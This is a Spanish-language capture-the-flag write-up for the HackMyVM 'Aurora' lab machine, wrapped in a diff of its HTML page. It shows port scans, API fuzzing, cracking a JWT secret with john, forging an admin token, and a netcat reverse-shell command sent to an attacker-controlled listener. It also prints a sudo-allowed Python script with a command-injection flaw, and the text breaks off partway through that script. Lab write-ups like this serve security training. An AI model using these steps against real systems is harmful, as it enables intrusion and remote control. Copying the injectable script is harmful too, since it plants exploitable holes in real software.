@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackMyVM - Aurora | noname</title>
+<meta property="og:title" content="HackMyVM - Aurora | noname" />
+<meta name="twitter:title" content="HackMyVM - Aurora | noname" />
+<meta itemprop="name" content="HackMyVM - Aurora | noname" />
+<meta name="application-name" content="HackMyVM - Aurora | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/hmv/aurora/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/" />
+  <meta property="og:image" content="https://0x-noname.github.io/" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-05-05T11:55:23&#43;0200 />
+    <meta property="article:published_time" content=2023-05-05T11:55:23&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackMyVM - Aurora",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-05-05",
+        "description": "",
+        "wordCount":  1163 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-05-05",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/aurora/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackMyVM - Aurora</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-05-05T11:55:23&#43;02:00" itemprop="datePublished"> May 5, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/hmv/aurora/aurora_logo.webp" alt="logo"></p>
+<ul>
+<li><em>Json Web Tokens</em></li>
+<li><em>Abusing Python Script</em></li>
+<li><em>GNU Screen 4.5.0</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -v -n 192.168.1.14
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,3000 192.168.1.14
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 dbf946e520816ceec72508ab2251366c (RSA)
+</span></span><span class="line"><span class="cl">|   256 33c09564294723dd864ee6b8073367ad (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 beaa6d4243dd7dd40e0d7478c189a136 (ED25519)
+</span></span><span class="line"><span class="cl">3000/tcp open  http    Node.js Express framework
+</span></span><span class="line"><span class="cl">|_http-title: Error
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="puerto-3000">Puerto 3000</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s http://192.168.1.14:3000
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html lang=&#34;en&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">&lt;meta charset=&#34;utf-8&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;title&gt;Error&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;/head&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;pre&gt;Cannot GET /&lt;/pre&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></div><p>Enumeración de directorios con el método post ya que por el método get no lo acepta.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯  wfuzz -c -t 200 --hc=404 -X POST -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt &#34;http://192.168.1.14:3000/FUZZ&#34;
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.1.14:3000/FUZZ
+</span></span><span class="line"><span class="cl">Total requests: 220560
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000053:   401        0 L      2 W        22 Ch       &#34;login&#34;                                                                                                                                        
+</span></span><span class="line"><span class="cl">000000825:   401        0 L      2 W        22 Ch       &#34;Login&#34;                                                                                                                                        
+</span></span><span class="line"><span class="cl">000002712:   400        0 L      6 W        29 Ch       &#34;Register&#34;                                                                                                                                     
+</span></span><span class="line"><span class="cl">000022423:   401        0 L      1 W        12 Ch       &#34;execute&#34;  
+</span></span></code></pre></div><h3 id="login">Login</h3>
+<p>Mando una petición <strong>POST</strong> a login y me muestra lo siguiente.</p>
+<pre tabindex="0"><code>❯ curl -s -X POST http://192.168.1.14:3000/login;echo
+Identifiants invalides
+</code></pre><h3 id="register">Register</h3>
+<p>En <strong>register</strong> y me dice que el rol no es válido.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://192.168.1.14:3000/Register;echo
+</span></span><span class="line"><span class="cl">The &#34;role&#34; field is not valid
+</span></span></code></pre></div><h3 id="execute">Execute</h3>
+<p>En <strong>execute</strong> no estoy autorizado.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://192.168.1.14:3000/execute;echo
+</span></span><span class="line"><span class="cl">Unauthorized
+</span></span></code></pre></div><p>Realizo un escaneo de rol y encuentra el rol <strong>user</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯  wfuzz -c -t 200 --hc=404 --hw=6 -X POST -H &#34;Content-Type:application/json&#34; -w /usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt -d &#39;{&#34;role&#34;:&#34;FUZZ&#34;}&#39; &#34;http://192.168.1.14:3000/Register&#34;
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.1.14:3000/Register
+</span></span><span class="line"><span class="cl">Total requests: 82
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                                
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000000075:   500        0 L      5 W        32 Ch       &#34;user&#34;
+</span></span></code></pre></div><p>Mando una petición <strong>POST</strong> con el rol user me dice que el campo username no puede ser nulo, necesita un usuario.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://192.168.1.14:3000/Register -H &#34;Content-Type:application/json&#34; -d &#39;{&#34;role&#34;:&#34;user&#34;}&#39;;echo
+</span></span><span class="line"><span class="cl">Column &#39;username&#39; cannot be null
+</span></span></code></pre></div><p>Pruebo con el usuario admin y me dice que el usuario existe.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://192.168.1.14:3000/Register -H &#34;Content-Type:application/json&#34; -d &#39;{&#34;role&#34;:&#34;user&#34;, &#34;username&#34;:&#34;admin&#34;}&#39;;echo
+</span></span><span class="line"><span class="cl">Username already exists
+</span></span></code></pre></div><p>Si pongo mi nombre de usuario me responde que necesita una contraseña.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://192.168.1.14:3000/Register -H &#34;Content-Type:application/json&#34; -d &#39;{&#34;role&#34;:&#34;user&#34;, &#34;username&#34;:&#34;noname&#34;}&#39;;echo
+</span></span><span class="line"><span class="cl">Column &#39;password&#39; cannot be null
+</span></span></code></pre></div><p>Me registro con mi nombre de usuario y le proporciono una contraseña.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://192.168.1.14:3000/Register -H &#34;Content-Type:application/json&#34; -d &#39;{&#34;role&#34;:&#34;user&#34;, &#34;username&#34;:&#34;noname&#34;, &#34;password&#34;:&#34;1234&#34;}&#39;;echo
+</span></span><span class="line"><span class="cl">Registration OK
+</span></span></code></pre></div><p>Una vez logueado me genera un token.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -s -X POST http://192.168.1.14:3000/login -H &#34;Content-Type:application/json&#34; -d &#39;{&#34;role&#34;:&#34;user&#34;, &#34;username&#34;:&#34;noname&#34;, &#34;password&#34;:&#34;1234&#34;}&#39;;echo
+</span></span><span class="line"><span class="cl">{&#34;accessToken&#34;:&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5vbmFtZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgzMzAwMTYwfQ.8rLJ8E_Ke-hHfXJVnzwOpnrUxK72SmZj8fLkMD6trfU&#34;}
+</span></span></code></pre></div><p>Con el token obtenido creo un archivo con el nombre hash para pasarselo a john.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">echo &#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5vbmFtZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjgzMzAwMTYwfQ.8rLJ8E_Ke-hHfXJVnzwOpnrUxK72SmZj8fLkMD6trfU&#34; &gt; hash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
+</span></span><span class="line"><span class="cl">Will run 4 OpenMP threads
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">nopassword       (?)
+</span></span></code></pre></div><p>Me voy a <a href="https://jwt.io/">JWT.io</a> pego mi token y cambio los parámetros de username y rol.</p>
+<p><img src="/../machines/hmv/aurora/jwtio.webp" alt="jwtio.png"></p>
+<p>Y finalmente cambio <code>your-256-bit-secret</code> por <code>nopassword</code>.
+<img src="/../machines/hmv/aurora/jwtio2.webp" alt="jwtio2.png"></p>
+<p>Enumero <strong>execute</strong> para buscar el parámetro value.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ wfuzz -c -t 200 --hc=404 --hw=63 -X POST -H &#34;Content-Type:application/json&#34; -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMzAwMTYwfQ.Nk5sSPZpxyvzZrCoWXIAxl3MTUIfQP9sMHlkhA67JG4&#39; -d &#39;{&#34;FUZZ&#34;:&#34;value&#34;}&#39; -w /usr/share/seclists/Discovery/Web-Content/common.txt &#34;http://192.168.1.14:3000/execute&#34;
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span class="line"><span class="cl">********************************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Target: http://192.168.1.14:3000/execute
+</span></span><span class="line"><span class="cl">Total requests: 4713
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+</span></span><span class="line"><span class="cl">=====================================================================
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">000001163:   500        0 L      2 W        14 Ch       &#34;command&#34; 
+</span></span></code></pre></div><p>Mando una petición por <strong>POST</strong> y obtengo el id del usuario <code>ww-data</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -X POST http://192.168.1.14:3000/execute -H &#34;Content-Type: application/json&#34; -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMzAwMTYwfQ.Nk5sSPZpxyvzZrCoWXIAxl3MTUIfQP9sMHlkhA67JG4&#39; -d &#39;{&#34;command&#34;:&#34;id&#34;}&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Como tengo ejecución de comandos me mando una shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl -X POST http://192.168.1.14:3000/execute -H &#34;Content-Type: application/json&#34; -H &#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjgzMzAwMTYwfQ.Nk5sSPZpxyvzZrCoWXIAxl3MTUIfQP9sMHlkhA67JG4&#39; -d &#39;{&#34;command&#34;:&#34;nc -e /bin/bash 192.168.1.18 1337&#34;}&#39;
+</span></span></code></pre></div><p>Obtengo la shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvnp 1337
+</span></span><span class="line"><span class="cl">listening on [any] 1337 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.1.18] from (UNKNOWN) [192.168.1.14] 36780
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@aurora:~$ sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries for www-data on aurora:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on aurora:
+</span></span><span class="line"><span class="cl">    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
+</span></span></code></pre></div><p>Archivo <code>tools.py</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_help</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">option</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="s2">&#34;--ping&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ping</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="s2">&#34;--traceroute&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">traceroute_ip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Invalid option.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_help</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_help</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python3 network_tool.py &lt;option&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Options:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;--ping           Ping an IP address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;--traceroute     Perform a traceroute on an IP address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ping</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ip_address</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter an IP address: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">forbidden_chars</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&amp;&#34;</span><span class="p">,</span> <span class="s2">&#34;;&#34;</span><span class="p">,</span> <span class="s2">&#34;(&#34;</span><span class="p">,</span> <span class="s2">&#34;)&#34;</span><span class="p">,</span> <span class="s2">&#34;||&#34;</span><span class="p">,</span> <span class="s2">&#34;|&#34;</span><span class="p">,</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;?&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">forbidden_chars</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">ip_address</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Forbidden character found: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ping -c 2 &#39;</span> <span class="o">+</span> <span class="n">ip_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">traceroute_ip</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ip_address</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter an IP address: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_valid_ip</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Invalid IP address.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">traceroute_command</span> <span class="o">=</span> <span class="s2">&#34;traceroute </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">traceroute_command</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_valid_ip</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">octets</span> <span class="o">=</span> <span class="n">ip_address</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">octets</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">octet</span> <span class="ow">in</span> <span class="n">octets</span><span class="p">:</span>
